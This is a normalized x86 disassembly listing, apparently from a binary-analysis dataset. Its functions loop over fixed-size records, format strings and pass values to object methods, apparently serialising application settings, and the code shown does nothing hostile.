mov edx [ eax ]
imul eax [ ebp - 0x154 ] 0x1a90
add ecx ebx
add eax esi
shl ecx 0x2
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + ecx * 4 ]
add eax ecx
add eax 0x648
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xb4 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xb0 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xac ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xa8 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xa4 ]
mov edx 0x2
call sub_4d318c
inc ebx
cmp ebx 0x8
jl r-xdata
inc [ ebp - 0x160 ]
mov ecx [ ebp - 0x160 ]
cmp ecx 0x2
jl r-xdata
lea eax [ ebx + 0x1 ]
lea ecx [ ebp - 0x180 ]
push eax
mov edx [ ebp - 0x15c ]
inc edx
push edx
push rw-data
push ecx
call sub_4c8520
mov [ ebp - 0x134 ] 0xfc
add esp 0x10
mov edx rw-data
lea eax [ ebp - 0x98 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x9c ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0x9c ] eax
push edx
lea edx [ ebp - 0x180 ]
inc [ ebp - 0x128 ]
lea eax [ ebp - 0x94 ]
call sub_4d3010
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x60 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0x90 ] eax
lea eax [ ebp - 0x90 ]
call sub_41e604
inc [ ebp - 0x128 ]
lea edx [ ebp - 0x90 ]
mov eax [ ebp - 0x148 ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x9c ]
lea eax [ ebp - 0xa0 ]
xor ecx ecx
call sub_4d2680
inc [ ebp - 0x128 ]
lea eax [ ebp - 0xa0 ]
inc [ ebp - 0x128 ]
mov edx [ eax ]
mov ecx [ ebp - 0x15c ]
shl ecx 0x3
mov eax ebx
add eax eax
add ecx eax
mov eax ecx
shl eax 0x2
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
imul ecx [ ebp - 0x154 ] 0x1a90
add ecx esi
add eax ecx
add eax 0x648
call sub_40daa4
dec [ ebp - 0x128 ]
dec [ ebp - 0x128 ]
lea eax [ ebp - 0xa0 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x9c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x98 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x94 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0x128 ]
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_4d318c
inc ebx
cmp ebx 0x4
jl r-xdata
inc [ ebp - 0x15c ]
mov ecx [ ebp - 0x15c ]
cmp ecx 0x2
jl r-xdata
jmp r-xdata
sub_410ee8
push ebp
mov ebp esp
add esp 0xfffffee0
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0xdc ] 0x2
lea edx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
call sub_4d2618
inc [ ebp - 0xdc ]
inc [ ebp - 0xdc ]
xor edx edx
mov [ ebp - 0xe8 ] 0xc
mov [ ebp - 0xe8 ] 0x18
mov [ ebp - 0x4 ] edx
lea edx [ ebp + 0xc ]
lea eax [ ebp - 0x4 ]
call sub_41e604
lea ecx [ ebp - 0x4 ]
mov dl 0x1
inc [ ebp - 0xdc ]
mov eax [ r-xdata ]
mov ecx [ ecx ]
call sub_405948
mov [ ebp - 0xfc ] eax
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x4 ]
mov edx 0x2
call sub_4d318c
push 0x2d
mov edx rw-data
lea eax [ ebp - 0xc ]
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx rw-data
mov ecx [ eax ]
lea eax [ ebp - 0x8 ]
push ecx
mov [ ebp - 0xe8 ] 0x24
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0xc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x14 ]
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
lea eax [ ebp - 0x10 ]
push edx
mov edx rw-data
mov [ ebp - 0xe8 ] 0x30
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0xc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x1a908 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x1c ]
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
lea eax [ ebp - 0x18 ]
push edx
mov edx rw-data
mov [ ebp - 0xe8 ] 0x3c
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0xc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x8 ]
mov al [ ecx + 0x1a90c ]
push eax
mov edx rw-data
lea eax [ ebp - 0x24 ]
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
lea eax [ ebp - 0x20 ]
push edx
mov edx rw-data
mov [ ebp - 0xe8 ] 0x48
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x14 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x24 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x8 ]
mov al [ ecx + 0x1a90d ]
push eax
mov edx rw-data
lea eax [ ebp - 0x2c ]
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
lea eax [ ebp - 0x28 ]
push edx
mov edx rw-data
mov [ ebp - 0xe8 ] 0x54
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x14 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x1a910 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x34 ]
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
lea eax [ ebp - 0x30 ]
push edx
mov edx rw-data
mov [ ebp - 0xe8 ] 0x60
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0xc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x34 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x30 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x1a914 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x3c ]
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
lea eax [ ebp - 0x38 ]
push edx
mov edx rw-data
mov [ ebp - 0xe8 ] 0x6c
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0xc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_4d318c
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x1a918 ]
push eax
mov edx rw-data
lea eax [ ebp - 0x44 ]
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
lea eax [ ebp - 0x40 ]
push edx
mov edx rw-data
mov [ ebp - 0xe8 ] 0x78
call sub_4d3010
inc [ ebp - 0xdc ]
mov edx [ eax ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0xc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x44 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_4d318c
xor ecx ecx
mov [ ebp - 0x100 ] ecx
mov [ ebp - 0xe8 ] 0xc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp - 0x100 ]
cmp eax edx
jg r-xdata
mov [ ebp - 0xe8 ] 0x90
mov ebx [ ebp - 0x100 ]
xor eax eax
inc ebx
mov [ ebp - 0x4c ] eax
inc [ ebp - 0xdc ]
push ebx
lea edx [ ebp - 0x4c ]
push rw-data
push edx
call sub_402d3c
add esp 0xc
lea edx [ ebp - 0x4c ]
inc [ ebp - 0xdc ]
xor eax eax
mov [ ebp - 0x48 ] eax
inc [ ebp - 0xdc ]
lea ecx [ ebp - 0x48 ]
inc [ ebp - 0xdc ]
mov eax rw-data
call sub_402d5c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x4c ]
xor edx edx
call sub_4d2728
mov [ ebp - 0xe8 ] 0x84
mov [ ebp - 0xe8 ] 0x84
xor ebx ebx
mov ecx [ ebp - 0xfc ]
mov [ ebp - 0xd4 ] ecx
mov eax [ ebp - 0xd4 ]
test eax eax
je r-xdata
lea esi [ ebx + 0x1 ]
lea eax [ ebp - 0x120 ]
push esi
push rw-data
push eax
call sub_4c8520
add esp 0xc
xor edx edx
mov [ ebp - 0x58 ] edx
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x58 ]
inc [ ebp - 0xdc ]
imul eax [ ebp - 0x100 ] 0x1a90
mov ecx [ ebp + 0x8 ]
add eax ecx
mov ecx ebx
add ecx ecx
shl ecx 0x2
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + ecx * 4 ]
add eax ecx
add eax 0x8
call sub_40d928
xor eax eax
mov [ ebp - 0x5c ] eax
lea edx [ ebp - 0x58 ]
lea eax [ ebp - 0x5c ]
call sub_41e604
lea edx [ ebp - 0x5c ]
lea eax [ ebp - 0x54 ]
inc [ ebp - 0xdc ]
mov ecx [ edx ]
lea edx [ ebp - 0x120 ]
push ecx
call sub_4d3010
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x48 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xe8 ] 0x9c
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x50 ]
call sub_41e604
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x50 ]
mov eax [ ebp - 0xfc ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi + 0x4 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x5c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x58 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x54 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x50 ]
mov edx 0x2
call sub_4d318c
push esi
push rw-data
lea ecx [ ebp - 0x120 ]
push ecx
call sub_4c8520
add esp 0xc
xor eax eax
mov [ ebp - 0x68 ] eax
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x68 ]
inc [ ebp - 0xdc ]
imul eax [ ebp - 0x100 ] 0x1a90
mov ecx [ ebp + 0x8 ]
add eax ecx
mov ecx ebx
add ecx ecx
shl ecx 0x2
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + ecx * 4 ]
add eax ecx
add eax 0x6c
call sub_40d928
xor eax eax
mov [ ebp - 0x6c ] eax
lea edx [ ebp - 0x68 ]
lea eax [ ebp - 0x6c ]
call sub_41e604
lea edx [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
inc [ ebp - 0xdc ]
mov ecx [ edx ]
lea edx [ ebp - 0x120 ]
push ecx
call sub_4d3010
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x48 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xe8 ] 0xa8
mov [ ebp - 0x60 ] eax
lea eax [ ebp - 0x60 ]
call sub_41e604
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x60 ]
mov eax [ ebp - 0xfc ]
pop ecx
mov edx [ edx ]
mov esi [ eax ]
call [ esi + 0x4 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x6c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x68 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x64 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x60 ]
mov edx 0x2
call sub_4d318c
inc ebx
cmp ebx 0x8
jl r-xdata
mov [ ebp - 0xe8 ] 0x84
xor esi esi
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x0
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp + 0xc ]
xor edx edx
call sub_4d2728
mov ecx [ ebp - 0xf8 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0xd4 ]
mov ecx [ edx ]
mov [ ebp - 0xd0 ] ecx
mov [ ebp - 0xe8 ] 0x114
mov edx 0x3
mov eax [ ebp - 0xd4 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0xe8 ] 0xfc
lea eax [ ebx + 0x1 ]
lea edx [ esi + 0x1 ]
push eax
push edx
lea ecx [ ebp - 0x120 ]
push rw-data
push ecx
call sub_4c8520
add esp 0x10
xor eax eax
mov [ ebp - 0x78 ] eax
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x78 ]
inc [ ebp - 0xdc ]
imul eax [ ebp - 0x100 ] 0x1a90
mov ecx [ ebp + 0x8 ]
add eax ecx
lea ecx [ ebx + esi * 8 ]
shl ecx 0x2
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + ecx * 4 ]
add eax ecx
add eax 0x648
call sub_40d928
xor eax eax
mov [ ebp - 0x7c ] eax
lea edx [ ebp - 0x78 ]
lea eax [ ebp - 0x7c ]
call sub_41e604
lea edx [ ebp - 0x7c ]
lea eax [ ebp - 0x74 ]
inc [ ebp - 0xdc ]
mov ecx [ edx ]
lea edx [ ebp - 0x120 ]
push ecx
call sub_4d3010
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x48 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xe8 ] 0xb4
mov [ ebp - 0x70 ] eax
lea eax [ ebp - 0x70 ]
call sub_41e604
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x70 ]
mov eax [ ebp - 0xfc ]
pop ecx
mov edx [ edx ]
mov edi [ eax ]
call [ edi + 0x4 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x7c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x78 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x70 ]
mov edx 0x2
call sub_4d318c
inc ebx
cmp ebx 0x8
jl r-xdata
inc esi
cmp esi 0x2
jl r-xdata
mov [ ebp - 0xe8 ] 0x84
xor ebx ebx
xor ecx ecx
mov [ ebp - 0x88 ] ecx
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x88 ]
inc [ ebp - 0xdc ]
imul ebx [ ebp - 0x100 ] 0x1a90
mov eax [ ebp + 0x8 ]
add ebx eax
mov eax ebx
add eax 0xc88
call sub_40d928
xor edx edx
mov [ ebp - 0x8c ] edx
lea edx [ ebp - 0x88 ]
lea eax [ ebp - 0x8c ]
call sub_41e604
lea ecx [ ebp - 0x8c ]
inc [ ebp - 0xdc ]
mov eax [ ecx ]
push eax
mov edx rw-data
lea eax [ ebp - 0x84 ]
call sub_4d3010
inc [ ebp - 0xdc ]
xor ecx ecx
mov edx [ eax ]
lea eax [ ebp - 0x80 ]
push edx
lea edx [ ebp - 0x48 ]
mov [ ebp - 0xe8 ] 0xc0
mov [ ebp - 0x80 ] ecx
call sub_41e604
lea ecx [ ebp - 0x80 ]
inc [ ebp - 0xdc ]
mov edx [ ecx ]
mov eax [ ebp - 0xfc ]
pop ecx
mov esi [ eax ]
call [ esi + 0x4 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x8c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x88 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x84 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x80 ]
mov edx 0x2
call sub_4d318c
xor ecx ecx
mov [ ebp - 0x98 ] ecx
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x98 ]
inc [ ebp - 0xdc ]
mov eax ebx
add eax 0xcec
call sub_40d928
xor ecx ecx
mov [ ebp - 0x9c ] ecx
lea edx [ ebp - 0x98 ]
lea eax [ ebp - 0x9c ]
call sub_41e604
lea ecx [ ebp - 0x9c ]
inc [ ebp - 0xdc ]
mov eax [ ecx ]
push eax
mov edx rw-data
lea eax [ ebp - 0x94 ]
call sub_4d3010
inc [ ebp - 0xdc ]
xor ecx ecx
mov edx [ eax ]
lea eax [ ebp - 0x90 ]
push edx
lea edx [ ebp - 0x48 ]
mov [ ebp - 0xe8 ] 0xcc
mov [ ebp - 0x90 ] ecx
call sub_41e604
lea ecx [ ebp - 0x90 ]
inc [ ebp - 0xdc ]
mov edx [ ecx ]
mov eax [ ebp - 0xfc ]
pop ecx
mov esi [ eax ]
call [ esi + 0x4 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x9c ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x98 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x94 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_4d318c
xor ecx ecx
mov [ ebp - 0xa8 ] ecx
inc [ ebp - 0xdc ]
lea edx [ ebp - 0xa8 ]
inc [ ebp - 0xdc ]
mov eax ebx
add eax 0xd50
call sub_40d928
xor ecx ecx
mov [ ebp - 0xac ] ecx
lea edx [ ebp - 0xa8 ]
lea eax [ ebp - 0xac ]
call sub_41e604
lea ecx [ ebp - 0xac ]
inc [ ebp - 0xdc ]
mov eax [ ecx ]
push eax
mov edx rw-data
lea eax [ ebp - 0xa4 ]
call sub_4d3010
inc [ ebp - 0xdc ]
xor ecx ecx
mov edx [ eax ]
lea eax [ ebp - 0xa0 ]
push edx
lea edx [ ebp - 0x48 ]
mov [ ebp - 0xe8 ] 0xd8
mov [ ebp - 0xa0 ] ecx
call sub_41e604
lea ecx [ ebp - 0xa0 ]
inc [ ebp - 0xdc ]
mov edx [ ecx ]
mov eax [ ebp - 0xfc ]
pop ecx
mov esi [ eax ]
call [ esi + 0x4 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xac ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xa8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xa4 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xa0 ]
mov edx 0x2
call sub_4d318c
xor ecx ecx
mov [ ebp - 0xb8 ] ecx
inc [ ebp - 0xdc ]
lea edx [ ebp - 0xb8 ]
inc [ ebp - 0xdc ]
mov eax ebx
add eax 0xdb4
call sub_40d928
xor ecx ecx
mov [ ebp - 0xbc ] ecx
lea edx [ ebp - 0xb8 ]
lea eax [ ebp - 0xbc ]
call sub_41e604
lea ecx [ ebp - 0xbc ]
inc [ ebp - 0xdc ]
mov eax [ ecx ]
push eax
mov edx rw-data
lea eax [ ebp - 0xb4 ]
call sub_4d3010
inc [ ebp - 0xdc ]
xor ecx ecx
mov edx [ eax ]
lea eax [ ebp - 0xb0 ]
push edx
lea edx [ ebp - 0x48 ]
mov [ ebp - 0xe8 ] 0xe4
mov [ ebp - 0xb0 ] ecx
call sub_41e604
lea ecx [ ebp - 0xb0 ]
inc [ ebp - 0xdc ]
mov edx [ ecx ]
mov eax [ ebp - 0xfc ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x4 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xbc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xb8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xb0 ]
mov edx 0x2
call sub_4d318c
mov [ ebp - 0xe8 ] 0x84
xor ebx ebx
lea eax [ ebx + 0x1 ]
lea edx [ ebp - 0x120 ]
push eax
push rw-data
push edx
call sub_4c8520
add esp 0xc
xor ecx ecx
mov [ ebp - 0xc8 ] ecx
inc [ ebp - 0xdc ]
lea edx [ ebp - 0xc8 ]
inc [ ebp - 0xdc ]
imul eax [ ebp - 0x100 ] 0x1a90
mov ecx [ ebp + 0x8 ]
add eax ecx
mov ecx ebx
shl ecx 0x2
lea ecx [ ecx + ecx * 4 ]
lea ecx [ ecx + ecx * 4 ]
add eax ecx
add eax 0xe18
call sub_40d928
xor eax eax
mov [ ebp - 0xcc ] eax
lea edx [ ebp - 0xc8 ]
lea eax [ ebp - 0xcc ]
call sub_41e604
lea edx [ ebp - 0xcc ]
lea eax [ ebp - 0xc4 ]
inc [ ebp - 0xdc ]
mov ecx [ edx ]
lea edx [ ebp - 0x120 ]
push ecx
call sub_4d3010
inc [ ebp - 0xdc ]
lea edx [ ebp - 0x48 ]
mov ecx [ eax ]
xor eax eax
push ecx
mov [ ebp - 0xe8 ] 0xf0
mov [ ebp - 0xc0 ] eax
lea eax [ ebp - 0xc0 ]
call sub_41e604
inc [ ebp - 0xdc ]
lea edx [ ebp - 0xc0 ]
mov eax [ ebp - 0xfc ]
pop ecx
mov edx [ edx ]
mov esi [ eax ]
call [ esi + 0x4 ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xcc ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xc8 ]
xor edx edx
call sub_4d2728
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xc4 ]
mov edx 0x2
call sub_4d318c
dec [ ebp - 0xdc ]
lea eax [ ebp - 0xc0 ]
mov edx 0x2
call sub_4d318c
inc ebx
cmp ebx 0x20
jl r-xdata
dec [ ebp - 0xdc ]
dec [ ebp - 0xdc ]
lea eax [ ebp - 0x48 ]
xor edx edx
call sub_4d2728
mov [ ebp - 0xe8 ] 0xc
inc [ ebp - 0x100 ]
sub_411d80
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov [ ebx ] 0xffffffff
xor edx edx
lea eax [ ebx + 0x8 ]
mov [ eax ] 0x0
inc edx
inc eax
cmp edx 0x44
jl r-xdata
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_411dbc
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
call sub_40f818
mov eax [ ebx ]
test eax eax
jl r-xdata
push ebx
call sub_411e30
pop ecx
mov ecx [ ebp + 0xc ]
mov [ ebx ] ecx
call sub_40f8a0
pop esi
pop ebx
pop ebp
retn
imul edx eax 0x1a90
add esi edx
add esi 0x8
push esi
call sub_40fbb8
pop ecx
sub_411e58
push ebp
mov ebp esp
add esp 0xffffffb4
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
mov [ ebp - 0x14 ] 0xc
mov ebx [ ebp + 0x8 ]
add ebx 0x10
lea eax [ ebp - 0x2c ]
push eax
call sub_411f68
pop ecx
mov esi eax
lea edi [ ebp - 0x34 ]
xor eax eax
mov ecx 0x8
[ edi ]
lea eax [ ebp - 0x34 ]
push esi
lea edx [ ebp - 0x3c ]
push edx
call sub_411f90
add esp 0x8
lea eax [ ebp - 0x3c ]
push eax
lea edx [ ebp - 0x44 ]
push edx
call sub_411f90
add esp 0x8
lea ecx [ ebp - 0x44 ]
push ecx
lea eax [ ebp - 0x4c ]
push eax
call sub_411f90
mov edx [ ebp - 0x34 ]
add esp 0x8
mov [ ebx + 0x8 ] edx
lea ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x30 ]
lea eax [ ebx + 0x10 ]
mov [ ebx + 0xc ] edx
push ecx
push eax
call sub_411fb8
add esp 0x8
lea edx [ ebp - 0x44 ]
push edx
lea ecx [ ebx + 0x18 ]
push ecx
call sub_411fe0
add esp 0x8
lea eax [ ebp - 0x3c ]
push eax
lea edx [ ebx + 0x20 ]
push edx
call sub_411f90
add esp 0x8
push ebx
call sub_412008
mov esi eax
pop ecx
mov [ ebx + 0x28 ] esi
xor eax eax
mov [ esi + 0x15 ] 0x1
mov [ esi + 0x4 ] esi
mov [ esi ] esi
mov [ esi + 0x8 ] esi
mov [ ebx + 0x2c ] eax
inc [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
mov eax [ r-xdata ]
mov dl 0x1
call sub_42723c
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
mov eax ebx
mov dl 0x1
call sub_427028
mov ecx [ ebp + 0x8 ]
xor eax eax
mov [ ecx + 0x40 ] eax
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] 0xffffffff
mov ecx [ ebp + 0x8 ]
xor eax eax
mov [ ecx + 0x8 ] eax
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411f68
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_411f90
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_411fb8
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_411fe0
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
mov edx [ ebp - 0x24 ]
mov [ fs : 0x0 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_412008
push ebp
mov ebp esp
add esp 0xffffffd4
mov eax rw-data
push ebx
push esi
push edi
call sub_4c517c
push 0x18
call sub_4bbbac
pop ecx
mov [ ebp - 0x28 ] eax
xor edx edx
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x14 ] 0xc
xor ebx ebx
mov eax [ ebp - 0x28 ]
push eax
push 0x4
call sub_415614
add esp 0x8
mov [ eax ] ebx
inc [ ebp - 0x2c ]
xor ebx ebx
mov eax [ ebp - 0x28 ]
add eax 0x4
push eax
push 0x4
call sub_415614
add esp 0x8
mov [ eax ] ebx
inc [ ebp - 0x2c ]
xor ebx ebx
mov eax [ ebp - 0x28 ]
add eax 0x8
push eax
push 0x4
call sub_415614
add esp 0x8
mov [ eax ] ebx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x28 ]
mov [ edx + 0x14 ] 0x1
